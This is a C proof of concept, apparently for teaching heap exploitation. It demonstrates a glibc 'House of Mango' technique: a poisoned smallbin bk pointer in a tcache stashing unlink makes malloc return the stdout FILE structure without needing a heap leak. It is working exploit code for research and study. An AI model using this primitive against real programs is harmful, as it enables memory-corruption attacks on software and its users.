/*
 * house_of_mango.c --- House of Mango.
 *
 * tcache stashing unlink, but the fake chunk is a FILE.
 *
 * The name follows the fruit family of heap houses (orange, tangerine):
 * the FILE is the flesh, and the fake chunk hidden at -0x10 is the stone.
 *
 * Idea
 * ----
 * The smallbin unlink validates only the chunk at the tail of the bin
 * (bck->fd == victim).  The stash loop that follows copies the remaining
 * smallbin chunks into the tcache without validating their bk at all:
 *
 *     while (tcache->num_slots[tc_idx] != 0 && (tc_victim = last(bin)) != bin) {
 *         bck = tc_victim->bk;
 *         bin->bk = bck;
 *         bck->fd = bin;              // write bin to bck + 0x10
 *         tcache_put (tc_victim);     // put (tc_victim + 0x10) into tcache
 *     }
 *
 * Pick P = (char *)stdout - 0x10 as the fake chunk:
 *
 *   P + 0x10 = stdout                     -> malloc() returns stdout itself
 *   P + 0x18 = &stdout->_IO_read_ptr      -> an existing heap pointer
 *                                            (the stdio buffer), so the chain
 *                                            continues without a heap leak
 *   buffer + 0x18 is attacker controlled  -> the loop stops cleanly
 *
 * No heap address is ever needed: the only heap pointer in the chain is the
 * one the FILE already holds.
 *
 * Requires glibc 2.43 / 2.44 semantics (16-slot tcache, calloc also takes
 * from the tcache), so the tcache has to be drained before the trigger.
 */
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define FILL 16
#define SZ   0x90

static uint64_t rd64 (const void *p)
{
  uint64_t v;
  memcpy (&v, p, sizeof v);
  return v;
}

static void wr64 (void *p, uint64_t v)
{
  memcpy (p, &v, sizeof v);
}

int main (void)
{
  /* The chain needs a buffered stdout: _IO_read_ptr has to point at the
     stdio buffer, not at _shortbuf.  A fixed size also keeps the offsets
     stable when stdout is a tty (line buffered) instead of a pipe.  */
  setvbuf (stdout, NULL, _IOFBF, 0x1000);

  fprintf (stderr, "1) leak the arena from an unsorted chunk\n");
  char *leak = malloc (0x4e8);          /* > 0x410: not cached by tcache */
  void *guard = malloc (0x20);          /* keeps it away from the top chunk */
  free (leak);
  uint64_t unsorted = rd64 (leak);      /* &main_arena.bins[0] - 0x10 */
  uint64_t smallbin = unsorted + 0x90;  /* the 0xa0 smallbin, 0x90 higher */
  fprintf (stderr, "   main_arena+8 = %#lx, smallbin(0xa0) = %#lx\n",
           (unsigned long) unsorted, (unsigned long) smallbin);

  fprintf (stderr, "2) prime the stdout buffer: +0x18 = smallbin head\n");
  unsigned char blob[0x200];
  memset (blob, 0, sizeof blob);
  memcpy (blob + 0x18, &smallbin, sizeof smallbin);
  fflush (stdout);
  fwrite (blob, 1, sizeof blob, stdout);  /* sits in the stdio buffer */
  assert (rd64 ((char *) stdout + 8) != 0);  /* _IO_read_ptr = buffer */

  fprintf (stderr, "3) groom: fill tcache, two chunks in the smallbin\n");
  void *fill[FILL];
  for (int i = 0; i < FILL; i++)
    fill[i] = malloc (SZ);
  char *c0 = malloc (SZ);
  void *g1 = malloc (SZ);
  char *c2 = malloc (SZ);
  void *g2 = malloc (SZ);
  for (int i = 0; i < FILL; i++)
    free (fill[i]);
  free (c0);
  free (c2);
  malloc (0xb0);                        /* sort c0/c2 into the smallbin */
  /* fd/bk in a bin are chunk pointers: user pointer - 0x10. */
  assert (rd64 (c2) == (uint64_t) c0 - 0x10);  /* c2->fd = c0 chunk */
  assert (rd64 (c0) == smallbin);              /* c0->fd = bin head */

  fprintf (stderr, "4) drain the tcache so malloc() reaches the smallbin\n");
  for (int i = 0; i < FILL; i++)
    malloc (SZ);

  fprintf (stderr, "5) poison c2->bk = stdout - 0x10\n");
  wr64 (c2 + 8, (uint64_t) ((char *) stdout - 0x10));

  void *victim = malloc (SZ);           /* unlink c0, then stash 3 chunks */
  assert (victim == c0);

  void *buffer = malloc (SZ);           /* the stdio buffer */
  void *out = malloc (SZ);              /* _IO_2_1_stdout_ */
  fprintf (stderr, "   buffer = %p, out = %p, stdout = %p\n",
           buffer, out, (void *) stdout);
  assert (out == (void *) stdout);

  fprintf (stderr, "6) malloc() returned stdout without any heap leak\n");
  _exit (0);   /* skip the stdio flush of our primed buffer */
}
